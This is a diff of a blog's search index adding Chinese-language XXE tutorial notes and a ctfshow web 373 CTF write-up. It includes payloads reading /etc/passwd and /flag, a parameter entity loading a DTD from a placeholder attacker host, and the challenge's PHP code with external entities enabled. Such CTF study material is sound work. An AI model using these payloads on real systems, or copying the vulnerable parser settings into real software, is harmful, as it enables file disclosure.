@@ -698,6 +698,8 @@
 <p>文件名xxe.dtd</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT 班级 (学生+)&gt;</span><br><span class="line">&lt;!ELEMENT 学生 (名字,年龄,介绍)&gt;</span><br><span class="line">&lt;!ELEMENT 名字 (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT 年龄 (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT 介绍 (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>
 
+<h5 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h5><p>PCDATA 的意思是被解析的字符数据（parsed character data）。<br>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</p>
+<h5 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h5><p>CDATA 的意思是字符数据（character data）。<br>CDATA 是不会被解析器解析的文本。</p>
 <h5 id="XML示例"><a href="#XML示例" class="headerlink" title="XML示例"></a>XML示例</h5><p>班级为根元素</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE 班级 <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;xxe.dtd&quot;</span>&gt;</span></span><br><span class="line">&lt;班级&gt;</span><br><span class="line">	&lt;学生&gt;</span><br><span class="line">        &lt;名字&gt;张三&lt;/名字&gt;</span><br><span class="line">        &lt;年龄&gt;19&lt;/年龄&gt;</span><br><span class="line">        &lt;介绍&gt;好孩子&lt;/介绍&gt;</span><br><span class="line">    &lt;/学生&gt;</span><br><span class="line">    &lt;学生&gt;</span><br><span class="line">        &lt;名字&gt;小明&lt;/名字&gt;</span><br><span class="line">        &lt;年龄&gt;21&lt;/年龄&gt;</span><br><span class="line">        &lt;介绍&gt;学习认真&lt;/介绍&gt;</span><br><span class="line">    &lt;/学生&gt;</span><br><span class="line">&lt;/班级&gt;</span><br></pre></td></tr></table></figure>
 
@@ -717,12 +719,49 @@
 <h5 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h5><p>参数实体只能在DTD文档中定义,DTD中引用</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">neo</span>[</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="meta-keyword">neo</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://xxx.xxx.xxx/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%xxe;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">neo</span>&gt;</span><span class="symbol">&amp;evil;</span><span class="tag">&lt;/<span class="name">neo</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
+<h4 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h4><h5 id="直接通过DTD外部实体声明"><a href="#直接通过DTD外部实体声明" class="headerlink" title="直接通过DTD外部实体声明"></a>直接通过DTD外部实体声明</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">neo</span>[</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="通过DTD文档引入外部DTD文档-再引入外部实体声明"><a href="#通过DTD文档引入外部DTD文档-再引入外部实体声明" class="headerlink" title="通过DTD文档引入外部DTD文档,再引入外部实体声明"></a>通过DTD文档引入外部DTD文档,再引入外部实体声明</h5><p>xml内容</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">neo</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;dtd文档url&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>dtd内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过参数实体</p>
+<p>先写一个外部实体声明,然后引用在攻击者服务器上面的外部实体声明</p>
+<p>xml内容</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY %d <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://xxx.xxx/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%d;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>dtd文件内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="协议支持"><a href="#协议支持" class="headerlink" title="协议支持"></a>协议支持</h4><p><img src="/images/xxe/image-20211225130238479.png" alt="image-20211225130238479"></p>
 ]]></content>
       <categories>
         <category>xxe</category>
       </categories>
       <tags>
         <tag>xxe</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xxe题目</title>
+    <url>/2021/12/25/xxe%E9%A2%98%E7%9B%AE/</url>
+    <content><![CDATA[<h3 id="ctfshow-web-373"><a href="#ctfshow-web-373" class="headerlink" title="ctfshow web 373"></a>ctfshow web 373</h3><p>php://input</p>
+<p>从官网信息来看，php://input是一个只读信息流，当请求方式是post的，并且enctype不等于”multipart/form-data”时，可以使用php://input来获取原始请求的数据。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);<span class="comment">//设置为false则允许外部实体加载</span></span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);<span class="comment">//将获取到的数据包内容转换成字符串</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<span class="comment">//LIBXML_NOENT 该标志允许替换XML字符实体引用(无论是否外部)也就是允许 &amp;a; 这样的写法</span></span><br><span class="line">    <span class="variable">$creds</span> = simplexml_import_dom(<span class="variable">$dom</span>);<span class="comment">//把 DOM 节点转换为 SimpleXMLElement 对象。</span></span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;<span class="comment">//找到里面的ctfshow标签</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;<span class="comment">//输出ctfshow标签的内容</span></span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>综合上面的分析,得知只需要将ctfshow标签中的内容设置成想要的内容即可,但是不能直接将ctfshow设置为根标签,在外部随便加一个标签就行</p>
+<p>payload</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">//上面为内部dtd文档</span><br><span class="line"><span class="tag">&lt;<span class="name">neo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">neo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>xxe</category>
+      </categories>
+      <tags>
+        <tag>xxe</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
 </search>
